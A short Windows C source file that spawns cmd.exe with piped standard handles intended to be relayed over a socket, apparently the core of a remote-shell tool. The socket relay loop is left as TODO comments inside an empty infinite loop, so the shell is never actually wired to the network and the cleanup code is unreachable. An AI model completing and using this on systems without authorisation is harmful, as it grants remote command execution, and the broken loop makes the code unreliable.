#include "shell.h"
#include <windows.h>
#include <string.h>

int shell_spawn(shell_sock_t s) {
    HANDLE hInR, hInW, hOutR, hOutW;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };

    if (!CreatePipe(&hInR,  &hInW,  &sa, 0)) return -1;
    if (!CreatePipe(&hOutR, &hOutW, &sa, 0)) return -1;

    STARTUPINFOA si = {0};
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdInput  = hInR;
    si.hStdOutput = hOutW;
    si.hStdError  = hOutW;

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE,
                        0, NULL, NULL, &si, &pi)) return -1;

    CloseHandle(hInR);
    CloseHandle(hOutW);

    /* Pump loop: socket <-> cmd.exe */
    char buf[4096];
    for (;;) {
        /* TODO: use select() to multiplex socket + pipe */
        /* recv from socket -> WriteFile(hInW) */
        /* ReadFile(hOutR)   -> send on socket  */
        /* break on EOF / error */
    }

    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hInW);
    CloseHandle(hOutR);
    return 0;
}

int shell_wait(void) { return 0; }